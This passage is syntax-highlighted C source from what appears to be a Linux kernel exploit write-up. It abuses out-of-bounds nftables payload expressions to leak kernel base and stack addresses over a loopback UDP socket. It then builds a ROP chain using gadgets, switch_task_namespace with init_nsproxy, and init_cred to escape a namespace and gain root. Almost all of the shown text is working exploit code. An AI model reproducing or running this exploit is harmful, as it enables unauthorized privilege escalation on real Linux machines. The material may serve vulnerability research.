</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// };
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">nftnl_rule_set_str</span>(r, NFTNL_RULE_TABLE, table);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_str</span>(r, NFTNL_RULE_CHAIN, chain);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_u32</span>(r, NFTNL_RULE_FAMILY, family);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfc</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">add_payload</span>(r,NFT_PAYLOAD_TRANSPORT_HEADER,<span style="color:#ae81ff">0xffffff00</span><span style="color:#f92672">+</span>off,<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0x8</span>,<span style="color:#ae81ff">0x70</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// TODO
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> r;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span><span style="color:#a6e22e">rop</span>(<span style="color:#66d9ef">uint8_t</span> family, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>table, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>chain)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	r <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_rule_alloc</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (r <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;OOM&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_set_str</span>(r, NFTNL_RULE_TABLE, table);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_str</span>(r, NFTNL_RULE_CHAIN, chain);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_u32</span>(r, NFTNL_RULE_FAMILY, family);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xd4</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">add_payload</span>(r,NFT_PAYLOAD_TRANSPORT_HEADER,<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0xffffff00</span><span style="color:#f92672">+</span>off<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0x8</span>,<span style="color:#ae81ff">0xff</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// add_payload(r,NFT_PAYLOAD_TRANSPORT_HEADER,0x0,1,0x8,0x8);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// TODO
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> r;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">install_rule_for_leak</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_rule</span>(<span style="color:#a6e22e">isolate_udp_pkt</span>(NFPROTO_IPV4, <span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;input&#34;</span>, <span style="color:#e6db74">&#34;leak&#34;</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating rule&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_rule</span>(<span style="color:#a6e22e">edit_udp_data</span>(NFPROTO_IPV4, <span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;leak&#34;</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating rule&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">install_rule_for_rop</span>(){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_rule</span>(<span style="color:#a6e22e">isolate_udp_pkt</span>(NFPROTO_IPV4, <span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;input2&#34;</span>, <span style="color:#e6db74">&#34;rop&#34;</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating rule&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_rule</span>(<span style="color:#a6e22e">rop</span>(NFPROTO_IPV4, <span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;rop&#34;</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating rule&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">udp_client</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> data){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> sockfd;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in server_addr;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x200</span>);
</span></span><span style="display:flex;"><span>    sockfd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_DGRAM, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sockfd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;socket&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    server_addr.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>    server_addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(<span style="color:#ae81ff">8888</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inet_pton</span>(AF_INET, <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#f92672">&amp;</span>(server_addr.sin_addr));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">connect</span>(sockfd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server_addr, <span style="color:#66d9ef">sizeof</span>((server_addr))) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    	<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;connect&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(sockfd);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> res <span style="color:#f92672">=</span> <span style="color:#a6e22e">write</span>(sockfd, data, <span style="color:#ae81ff">0x200</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">close</span>(sockfd);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">udp_server</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> buf){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sockaddr_in server_addr;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">socklen_t</span> server_addr_len;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sockaddr_in client_addr;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">socklen_t</span> client_addr_len;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> tmp[<span style="color:#ae81ff">0x200</span>];
</span></span><span style="display:flex;"><span>	client_addr_len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>( client_addr);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_DGRAM, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>	server_addr.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>    server_addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(<span style="color:#ae81ff">8888</span>);
</span></span><span style="display:flex;"><span>	server_addr.sin_addr.s_addr<span style="color:#f92672">=</span><span style="color:#a6e22e">htonl</span>(INADDR_ANY );
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bind</span>(fd, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>server_addr, <span style="color:#66d9ef">sizeof</span>(server_addr)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;bind&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">recvfrom</span>(fd, buf, <span style="color:#ae81ff">0x200</span>,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>client_addr,client_addr_len);	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">recvfrom</span>(fd, tmp, <span style="color:#ae81ff">0x200</span>,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>client_addr,client_addr_len);	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> tid, status;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pthread_t</span> p_thread;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> udpbuf[<span style="color:#ae81ff">512</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>,};
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint64_t</span> kernel_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(udpbuf, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">512</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">new_ns</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;ip link set lo up&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Leak kernel base address</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;  [-] install udp server</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span> buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x200</span>);
</span></span><span style="display:flex;"><span>    tid <span style="color:#f92672">=</span> <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>p_thread, NULL, udp_server, buf);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (tid <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;thread create error : &#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;  [-] setup nftables</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_table</span>(NFPROTO_IPV4, <span style="color:#e6db74">&#34;filter&#34;</span>, false) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating table&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_chain</span>(<span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;input&#34;</span>, NF_INET_LOCAL_IN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating chain&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_chain</span>(<span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;leak&#34;</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating chain&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">install_rule_for_leak</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;  [-] send &amp; recv udp packet</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">usleep</span>(<span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">udp_client</span>(udpbuf);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">hexdump</span>(buf,<span style="color:#ae81ff">0x200</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint64_t</span> data_base <span style="color:#f92672">=</span>  buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x17e0d8</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint64_t</span> cur_stack <span style="color:#f92672">=</span> buf[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3fe8</span>;
</span></span><span style="display:flex;"><span>	kernel_base <span style="color:#f92672">=</span> buf[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10000d9</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;  [-] kernel base address 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernel_base);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;  [-] leaked 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, cur_stack);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;  [-] leaked 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, data_base);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">delete_chain</span>(<span style="color:#e6db74">&#34;filter&#34;</span>,<span style="color:#e6db74">&#34;input&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">delete_chain</span>(<span style="color:#e6db74">&#34;filter&#34;</span>,<span style="color:#e6db74">&#34;leak&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[+] Ropping&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_chain</span>(<span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;rop&#34;</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating chain&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">create_chain</span>(<span style="color:#e6db74">&#34;filter&#34;</span>, <span style="color:#e6db74">&#34;input2&#34;</span>, NF_INET_LOCAL_IN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;error creating chain&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">install_rule_for_rop</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;  [-] install rop chain&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(udpbuf, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">512</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> cur_stack <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f88</span>; i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> cliret; i<span style="color:#f92672">++</span>;	
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> prbp;i<span style="color:#f92672">++</span>; 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> cur_stack<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3f60</span>;i<span style="color:#f92672">++</span>; 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100016d</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>; 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400100</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400100</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400100</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> cur_stack<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3f58</span>;i<span style="color:#f92672">++</span>; <span style="color:#75715e">//sfp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> cur_stack<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3f58</span>;i<span style="color:#f92672">++</span>; <span style="color:#75715e">//r15
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> bpf_get_current_task;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> movrdirax;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> prsi;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> data_base <span style="color:#f92672">+</span> data_init_nsproxy;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> switch_task_namespace;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> prdi;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> data_base <span style="color:#f92672">+</span> data_init_cred;i<span style="color:#f92672">++</span>;
